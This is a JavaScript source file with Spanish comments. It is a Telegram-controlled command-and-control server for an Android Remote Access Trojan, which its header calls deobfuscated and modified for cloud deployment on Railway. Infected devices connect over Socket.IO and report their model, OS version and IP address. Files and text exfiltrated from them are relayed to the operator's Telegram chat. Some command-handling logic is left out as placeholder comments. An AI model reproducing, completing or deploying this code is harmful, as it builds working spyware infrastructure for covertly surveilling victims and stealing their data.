// El código desofuscado corresponde a un Remote Access Trojan (RAT)
// Mejorado con checks de sistema de archivos para despliegues en la nube (Railway).

// Dependencias de Node.js
const express = require('express'),
    http = require('http'),
    {
        Server
    } = require('socket.io'),
    TelegramBot = require('node-telegram-bot-api'),
    fs = require('fs'),
    multer = require('multer');

// --- PENDIENTE DE CONFIGURACIÓN DE SISTEMA DE ARCHIVOS (CRÍTICO PARA DESPLIEGUE) ---

const DATA_FILE = './data.json';
const FILE_DIR = 'file';

// 1. Asegurar que el directorio de archivos exista
if (!fs.existsSync(FILE_DIR)) {
    try {
        fs.mkdirSync(FILE_DIR);
        console.log(`Directorio '${FILE_DIR}' creado exitosamente.`);
    } catch (e) {
        console.error(`ERROR: No se pudo crear el directorio '${FILE_DIR}':`, e);
        // Si no puede crear el directorio de archivos, la aplicación fallará.
    }
}

// 2. Asegurar que el archivo de administradores exista e inicializarlo
if (!fs.existsSync(DATA_FILE)) {
    try {
        fs.writeFileSync(DATA_FILE, '[]', 'utf8');
        console.log(`Archivo '${DATA_FILE}' creado e inicializado.`);
    } catch (e) {
        console.error(`ERROR: No se pudo inicializar el archivo '${DATA_FILE}':`, e);
    }
}

// --- Configuración y Inicialización ---

// El bot usa process.env.token, que debe ser configurado en Railway.
const bot = new TelegramBot(process.env.token, {
    polling: !![]
});
const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Almacenamiento de dispositivos conectados y acciones en curso
const connectedDevices = new Map();
const currentActions = new Map();

// Configuración de almacenamiento para archivos subidos
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        // Usa la constante definida arriba
        cb(null, FILE_DIR); 
    },
    filename: (req, file, cb) => {
        cb(null, Date.now() + '-' + file.originalname);
    }
});
const upload = multer({
    storage: storage
});

// Middleware y Rutas (sin cambios, usa 'file' y 'text')
app.use(express.static('HTML'));
// ... [El resto de las rutas post '/upload' y '/text' siguen sin cambios] ...

app.post('/upload', upload.single('file'), (req, res) => {
    // Manejo de la subida de archivos (imágenes, audios)
    const deviceId = req.headers['currentTarget'];
    if (deviceId && connectedDevices.get(deviceId)) {
        bot.sendMessage(connectedDevices.get(deviceId).chatId, '<b>✯ 𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ' + connectedDevices.get(deviceId).model + ' 𝙳𝚎𝚟𝚒𝚌𝚎 ✯</b>\x0a\x0a' + '𝚏𝚒𝚕𝚎 𝚗𝚊𝚖𝚎 → ' + req.file.originalname + '\x0a𝚜𝚒𝚣𝚎 → ' + req.file.size + ' 𝙱\x0a𝚞𝚛𝚕 → ' + req.file.url + '\x0a', {
            parse_mode: 'HTML'
        });
    }
    res.send('Done');
});

app.post('/text', (req, res) => {
    const deviceId = req.headers['currentTarget'];
    if (deviceId && connectedDevices.get(deviceId)) {
        bot.sendMessage(connectedDevices.get(deviceId).chatId, '<b>✯ 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ' + connectedDevices.get(deviceId).model + ' 𝙳𝚎𝚟𝚒𝚌𝚎 ✯</b>\x0a\x0a𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>' + req.body.text, {
            parse_mode: 'HTML'
        });
    }
    res.send('Done');
});

// Manejo de conexiones Socket.IO (dispositivos Android)
io.on('connection', socket => {
    const deviceId = socket.handshake.headers['currentTarget'];
    const model = socket.handshake.headers['model'];
    const version = socket.handshake.headers['version'];
    const time = socket.handshake.headers['time'];
    const ip = socket.handshake.headers['host'];

    if (!connectedDevices.get(deviceId)) {
        connectedDevices.set(deviceId, {
            socket: socket,
            model: model,
            version: version,
            time: time,
            ip: ip,
            currentAction: 'no information',
            chatId: ''
        });
        
        // La lógica de lectura/escritura de data.json ya está protegida
        try {
            JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')).forEach(chatId => {
                connectedDevices.get(deviceId).chatId = chatId;
                bot.sendMessage(chatId, '<b>✯ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\x0a\x0a' + '<b>𝚖𝚘𝚍𝚎𝚕</b> → ' + model + '\x0a<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ' + version + '\x0a<b>𝚝𝚒𝚖𝚎</b> → ' + time + '\x0a<b>𝚒𝚙</b> → ' + ip + '\x0a\x0a', {
                    parse_mode: 'HTML'
                });
            });
        } catch (e) {
            console.log('error en lectura de admins: ' + e);
        }
    }

    // ... [Resto de lógica de Socket.IO sigue sin cambios] ...
    socket.on('disconnect', () => {
        const device = connectedDevices.get(deviceId);
        if (device) {
            bot.sendMessage(device.chatId, '<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\x0a\x0a' + '<b>𝚖𝚘𝚍𝚎𝚕</b> → ' + device.model + '\x0a<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ' + device.version + '\x0a<b>𝚝𝚒𝚖𝚎</b> → ' + device.time + '\x0a<b>𝚒𝚙</b> → ' + device.ip + '\x0a\x0a', {
                parse_mode: 'HTML'
            });
            connectedDevices.delete(deviceId);
        }
    });

    socket.on('commend', data => {
        const device = connectedDevices.get(deviceId);
        if (device) {
            bot.sendMessage(device.chatId, data, {
                parse_mode: 'HTML'
            });
            device.currentAction = 'no information';
        }
    });
});

// --- Lógica del Bot de Telegram (Comandos) ---

bot.on('message', async msg => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (text) {
        // Inicialización y persistencia del Chat ID (quién es admin)
        let admins = [];
        try {
            admins = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        } catch (e) {
            // Este catch es para errores de parseo, no de archivo faltante, 
            // pero es útil para diagnosticar si el archivo existe pero está corrupto.
            fs.writeFileSync(DATA_FILE, '[]', 'utf8');
            console.log("data.json corrupto, re-inicializado.");
        }
        if (!admins.includes(chatId)) {
            admins.push(chatId);
            fs.writeFileSync(DATA_FILE, JSON.stringify(admins), 'utf8');
        }

        const deviceCount = connectedDevices.size;
        const currentDevice = connectedDevices.get(currentActions.get(chatId));

        if (text === '/start' || text === '✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯') {
            // Mostrar menú principal
            // ... (lógica del menú)
        } else if (text === '✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯') {
            // ... (lógica de listar dispositivos)
        }
        // ... [El resto de la lógica de comandos sigue sin cambios] ...
    }
});

// Iniciar el servidor Express/Socket.IO
server.listen(process.env.PORT || 3000, () => {
    console.log('listening on port ' + (process.env.PORT || 3000));
});
